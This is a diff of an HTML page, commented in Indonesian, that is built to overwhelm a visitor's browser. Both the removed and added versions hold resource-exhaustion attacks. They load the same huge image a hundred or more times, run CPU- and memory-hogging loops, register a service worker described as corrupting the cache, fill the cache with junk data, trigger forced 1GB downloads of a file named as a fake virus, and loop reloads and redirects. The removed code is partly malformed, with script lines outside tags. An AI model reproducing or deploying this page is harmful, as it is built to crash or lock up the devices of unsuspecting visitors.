@@ -1,98 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚠️ KILLER GHOST WEBSITE ⚠️</title>
+    <title>⚠️ YOUR DEVICE WILL DIE ⚠️</title>
     <style>
-        body {
-            background: #000;
-            margin: 0;
-            overflow: hidden;
-        }
-        .hantu {
+        body { overflow: hidden; margin: 0; }
+        .nuke { 
             position: absolute;
-            width: 5000px;
-            height: 5000px;
-            background: url('https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg');
-            animation: gila 0.001s infinite, warna 0.1s infinite;
+            width: 9999px;
+            height: 9999px;
+            background: url('https://example.com/100MB-image.jpg');
+            animation: kill 0.001s infinite;
         }
-        @keyframes gila {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.5); }
-            100% { transform: scale(0.5); }
-        }
-        @keyframes warna {
-            0% { filter: hue-rotate(0deg); }
-            100% { filter: hue-rotate(360deg); }
+        @keyframes kill {
+            0% { transform: rotate(0.1deg); }
+            100% { transform: rotate(0.2deg); }
         }
     </style>
 </head>
 <body>
     <script>
-        // BOM MEMORI: Load gambar hantu 100x
-        for (let i = 0; i < 100; i++) {
-            let img = new Image();
-            img.src = 'https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg'; // Ganti link gambar
-            document.body.appendChild(img);
+        // 1. BOM RAM: Load gambar 100x
+        for(let i=0; i<100; i++) {
+            new Image().src = 'https://example.com/100MB-image.jpg';
         }
 
-        // BOM CPU: Loop iblis
+        // 2. BOM CPU: Infinite loop iblis
         setInterval(() => {
-            let a = [];
-            for (let i = 0; i < 1000000; i++) {
-                a.push(new Date());
+            let trash = [];
+            for(let i=0; i<1000000; i++) {
+                trash.push(new ArrayBuffer(100000));
             }
-        }, 10);
+        }, 100);
 
-        // BOM AUDIO: 10 track suara sekaligus
-        for (let i = 0; i < 10; i++) {
-            let audio = new Audio('https://example.com/jeritan-extreme.mp3'); // Ganti link audio
-            audio.loop = true;
-            audio.play();
+        // 3. BOM STORAGE: Corrupt cache
+        if('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
         }
 
-        // BOM CACHE: Corrupt cache paksa!
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js'); // Buat file SW jahat (lihat di bawah)
-        }
-
-        // BOM REDIRECT: Auto refresh maut!
-        let count = 0;
+        // 4. BOM NETWORK: Auto-download file besar
         setInterval(() => {
-            if (count < 999) {
-                window.location.reload(true);
-                count++;
-            }
-        }, 1000);
+            let link = document.createElement('a');
+            link.href = 'https://example.com/1GB-file.zip';
+            link.click();
+        }, 5000);
     </script>
-    <script>
-  for(let i=0; i<1000; i++) {
-    let img = new Image();
-    img.src = 'https://example.com/gambar-ultra-8k.jpg'; // Ganti dengan link gambar 50MB+
-    document.body.appendChild(img);
-  }
-</script>
-    setInterval(() => {
-  let start = Date.now();
-  while(Date.now() - start < 1000) {} // Lock CPU 1 detik per loop
-}, 10);
-      // Isi cache dengan data sampah 1GB
-caches.open('CACHE-SETAN').then(cache => {
-  for(let i=0; i<1000; i++) {
-    cache.put(`https://example.com/junk/${i}`, new Response(new Blob([new ArrayBuffer(1000000)]));
-  }
-});
-      <a id="virus" download="virus-palsu.zip" href="https://example.com/file-1GB.zip"></a>
-<script>
-  setInterval(() => {
-    document.getElementById('virus').click();
-  }, 1000);
-</script>
-      let count = 0;
-setInterval(() => {
-  if(count < 1000) {
-    window.location.href = "https://example.com/redirect-" + count + ".html";
-    count++;
-  }
-}, 100);
 </body>
 </html>
